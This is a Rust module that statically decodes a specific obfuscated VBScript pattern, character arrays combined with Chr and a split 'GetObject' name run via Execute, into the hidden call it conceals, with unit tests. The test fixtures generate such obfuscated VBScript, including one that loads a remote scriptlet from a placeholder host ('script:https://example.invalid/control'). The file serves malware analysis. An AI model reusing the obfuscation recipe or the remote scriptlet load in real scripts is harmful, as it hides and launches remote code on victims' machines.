//! Reduce one complete, literal-only VBScript array recipe. No interpreter is
//! used. Reject extra statements, mutations, unequal bindings or invalid units.
use regex::Regex;
use std::sync::LazyLock;
#[allow(clippy::expect_used)]
static RECIPE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(concat!(
 r#"(?ix-u)\A\s*(?:Dim\s+[\w,\s]+:\s*)?"#,
 r#"(\w+)\s*=\s*Array\(([a-z0-9&,+\s-]+)\)\s*:\s*"#,
 r#"(\w+)\s*=\s*Array\(([a-z0-9&,+\s-]+)\)\s*:\s*"#,
 r#"(\w+)\s*=\s*""\s*:\s*For\s+(\w+)\s*=\s*0\s+To\s+UBound\((\w+)\)\s*:\s*"#,
 r#"(\w+)\s*=\s*(\w+)\s*&\s*ChrW?\(\s*(\w+)\((\w+)\)\s*([+-])\s*(\w+)\((\w+)\)\s*\)\s*:\s*Next\s*:\s*"#,
 r#"(\w+)\s*=\s*((?:"[A-Za-z]+"\s*&\s*){0,8}"[A-Za-z]+")\s*:\s*"#,
 r#"Execute\s+(\w+)\s*&\s*"\((\w+)\)"\s*\z"#
)).expect("bounded literal VBScript recipe")
});
fn numbers(raw: &str) -> Option<Vec<i64>> {
    let v = raw
        .split(',')
        .map(|part| {
            let p = part.trim();
            if p.len() > 12 {
                return None;
            }
            if let Some(h) = p.strip_prefix("&H").or_else(|| p.strip_prefix("&h")) {
                i64::from_str_radix(h, 16).ok()
            } else {
                p.parse().ok()
            }
        })
        .collect::<Option<Vec<_>>>()?;
    (v.len() <= 4096).then_some(v)
}
pub(super) fn decode(source: &str) -> Option<String> {
    if source.len() > 40000 {
        return None;
    }
    let c = RECIPE.captures(source)?;
    let equal = |a, b| {
        c.get(a)
            .zip(c.get(b))
            .is_some_and(|(x, y)| x.as_str().eq_ignore_ascii_case(y.as_str()))
    };
    for (a, b) in [
        (1, 7),
        (1, 10),
        (3, 13),
        (5, 8),
        (5, 9),
        (5, 18),
        (6, 11),
        (6, 14),
        (15, 17),
    ] {
        if !equal(a, b) {
            return None;
        }
    }
    for a in [1, 3, 5, 6, 15] {
        for b in [1, 3, 5, 6, 15] {
            if a < b && equal(a, b) {
                return None;
            }
        }
    }
    let a = numbers(c.get(2)?.as_str())?;
    let b = numbers(c.get(4)?.as_str())?;
    if a.is_empty() || a.len() != b.len() {
        return None;
    }
    let plus = c.get(12)?.as_str() == "+";
    let units = a
        .iter()
        .zip(b)
        .map(|(a, b)| {
            u16::try_from(if plus {
                a.checked_add(b)?
            } else {
                a.checked_sub(b)?
            })
            .ok()
        })
        .collect::<Option<Vec<_>>>()?;
    if units.iter().any(|n| *n > 255) {
        return None;
    }
    let value = String::from_utf16(&units).ok()?;
    let name = c
        .get(16)?
        .as_str()
        .split('&')
        .map(|s| s.trim().trim_matches('"'))
        .collect::<String>();
    // Only this known one-argument API has the reconstructed call semantics.
    if !name.eq_ignore_ascii_case("GetObject") {
        return None;
    }
    let quoted = value.replace('"', "\"\"");
    let at = source.to_ascii_lowercase().rfind("execute")?;
    Some(format!("{}GetObject(\"{}\")", &source[..at], quoted))
}
#[cfg(test)]
mod tests {
    use super::*;
    fn fixture(s: &str, op: &str) -> String {
        let a = s
            .encode_utf16()
            .map(|n| if op == "+" { n - 3 } else { n + 3 })
            .map(|n| format!("&H{n:x}"))
            .collect::<Vec<_>>()
            .join(",");
        let b = vec!["3"; s.encode_utf16().count()].join(",");
        format!(
            "Dim a,b,t,i : a=Array({a}):b=Array({b}):t=\"\":For i=0 To UBound(a):t=t&Chr(a(i){op}b(i)):Next:k=\"Ge\"&\"tObj\"&\"ect\":Execute k&\"(t)\""
        )
    }
    #[test]
    fn addition_subtraction_renaming_and_quoting() {
        for op in ["+", "-"] {
            let s = fixture("script:https://example.invalid/control", op);
            let d = decode(&s).expect("literal recipe");
            assert!(d.ends_with("GetObject(\"script:https://example.invalid/control\")"));
            assert!(decode(&s.replace("a(", "other(")).is_none());
        }
        assert!(
            decode(&fixture("hello\"world", "+"))
                .expect("quote")
                .ends_with("GetObject(\"hello\"\"world\")")
        );
    }
    #[test]
    fn rejects_mutations_aliasing_unresolved_and_extra_statements() {
        let s = fixture("benign-control", "+");
        for s in [
            s.replace("UBound(a)", "UBound(b)"),
            s.replace("Chr(a(i)", "Chr(a(j)"),
            s.replace("k&\"(t)\"", "k&\"(other)\""),
            s.replace("&H5f", "dynamic"),
            format!("{s}:MsgBox 1"),
            s.replace("&H5f", "&Hfffffff"),
        ] {
            assert!(decode(&s).is_none(), "{s}");
        }
    }
    #[test]
    fn bounds_and_non_recipe() {
        assert!(decode(&"x".repeat(40001)).is_none());
        assert!(decode("MsgBox \"ordinary\"").is_none());
    }
}
